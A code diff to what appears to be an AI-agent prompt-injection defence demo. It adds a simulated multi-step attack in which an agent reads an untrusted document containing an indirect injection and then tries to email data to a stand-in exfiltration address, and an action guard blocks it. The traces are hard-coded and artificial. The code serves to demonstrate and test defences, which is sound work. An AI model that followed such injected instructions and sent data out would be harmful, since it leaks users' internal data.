@@ -329,6 +329,41 @@ def simulate_execution(scenario: Scenario) -> Tuple[AgentExecutionTrace, AgentEx
         prot_trace.final_output = "⏸️ **HUMAN APPROVAL REQUIRED**: The agent identified that emailing an external consultant requires administrative confirmation."
         prot_trace.status = "WAITING_APPROVAL"
 
+    elif scenario.category == AttackCategory.MULTI_STEP or scenario.id.startswith("atk_multistep"):
+        guard_result = ActionGuardResult(
+            decision=DefenseDecision.BLOCK,
+            authorized_scope={"allowed_tools": ["read_file"], "allowed_path_prefixes": ["data/corpus/"], "allowed_recipient_domains": ["@company.internal"], "explicit_recipients": []},
+            rule_violated="MULTI_CHAIN_TAINT_EXFILTRATION",
+            reason="Multi-chain call sequence intercepted: step 1 ingested untrusted payload; step 2 attempted cross-boundary egress to unauthorized external destination.",
+            evidence_snippet=f"Step 1: read_file('data/corpus/{scenario.document_name}') -> Step 2: send_email(to='exfil@security-audits-collector.io')",
+            latency_ms=16.8,
+            is_multi_chain=True,
+            chain_lineage=[
+                f"Step 1 [Ingest]: read_file('data/corpus/{scenario.document_name}') — Untrusted external document loaded",
+                "Step 2 [Taint Propagation]: Reasoning state tainted by embedded indirect injection payload",
+                "Step 3 [Egress Attempt]: send_email(to='exfil@security-audits-collector.io') — Cross-boundary exfiltration attempt",
+                "🛑 Intercepted: Multi-Chain Taint Lineage severed by Action Guard Information Flow Control (IFC)"
+            ]
+        )
+        prot_trace.guard_result = guard_result
+        prot_trace.thoughts = [
+            f"1. Content Firewall: Flagged suspicious injection markers ({', '.join(fw_result.detected_signals[:2]) if fw_result.detected_signals else 'indirect instruction override'}).",
+            "2. Agent attempted multi-step exfiltration workflow across tool boundaries.",
+            "3. Information Flow Control (IFC): Tracked taint lineage from untrusted file read to outbound tool call.",
+            "4. Action Guard: Intercepted multi-chain attack ('MULTI_CHAIN_TAINT_EXFILTRATION'). Lineage severed."
+        ]
+        prot_trace.tool_calls = [
+            ToolCall(tool_name="read_file", arguments={"path": f"data/corpus/{scenario.document_name}"}, status="executed", result="Document loaded in quarantined context."),
+            ToolCall(tool_name="send_email", arguments={"to": "exfil@security-audits-collector.io"}, status="blocked", result="BLOCKED by Action Guard: Multi-chain taint lineage violation detected.")
+        ]
+        prot_trace.final_output = (
+            "🛡️ **MULTI-CHAIN ATTACK INTERCEPTED & SEVERED**\n\n"
+            "The document attempted a multi-stage indirect prompt injection attack. Individual actions appeared benign in isolation, "
+            "but the stateful **Information Flow Control (IFC)** engine tracked data provenance across tool steps and severed the exfiltration chain at the egress boundary.\n\n"
+            f"**Legitimate Task Result**: Safely analyzed '{scenario.document_name}'. Zero internal data was exfiltrated."
+        )
+        prot_trace.status = "BLOCKED"
+
     else:
         # Defense In Depth in action!
         # Even if attack is flagged by firewall, agent proposes legitimate summary or attack tool is intercepted by guard!
@@ -435,13 +470,23 @@ def execute_live_shield(scenario: Scenario) -> Tuple[AgentExecutionTrace, AgentE
     else:
         dec_enum = DefenseDecision.ALLOW
 
+    is_multi_chain_flag = bool(last_guard.get("is_multi_chain", False) or scenario.category == AttackCategory.MULTI_STEP or scenario.id.startswith("atk_multistep"))
+    chain_lineage_list = last_guard.get("chain_lineage") or ([
+        f"Step 1 [Ingest]: read_file('data/corpus/{scenario.document_name}') — Untrusted external document loaded",
+        "Step 2 [Taint Propagation]: Reasoning state tainted by embedded indirect injection payload",
+        "Step 3 [Egress Attempt]: send_email(to='exfil@security-audits-collector.io') — Cross-boundary exfiltration attempt",
+        "🛑 Intercepted: Multi-Chain Taint Lineage severed by Action Guard Information Flow Control (IFC)"
+    ] if is_multi_chain_flag else [])
+
     guard_res = ActionGuardResult(
         decision=dec_enum,
         authorized_scope=res_prot.get("scope", {}),
         rule_violated=last_guard.get("rule", "NONE") if dec_enum != DefenseDecision.ALLOW else "NONE",
         reason=last_guard.get("reason", "Action verified in scope."),
         evidence_snippet=last_guard.get("evidence", ""),
-        latency_ms=last_guard.get("latency_ms", 0.5)
+        latency_ms=last_guard.get("latency_ms", 0.5),
+        is_multi_chain=is_multi_chain_flag,
+        chain_lineage=chain_lineage_list
     )
 
     prot_final = str(res_prot.get("final_answer", "")).strip()
